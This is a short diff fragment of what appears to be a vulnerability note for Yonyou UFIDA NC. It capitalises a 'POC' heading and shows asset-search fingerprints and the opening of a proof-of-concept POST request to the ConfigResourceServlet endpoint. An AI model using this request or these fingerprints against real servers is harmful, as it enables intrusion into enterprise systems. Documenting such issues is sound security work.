@@ -7,7 +7,7 @@ icon_hash="1085941792"
 app="用友-UFIDA-NC"
 ```
 
-## poc
+## POC
 ```
 POST /servlet/~ic/nc.bs.framework.server.ConfigResourceServlet HTTP/1.1
 Host: 192.168.63.129:8088
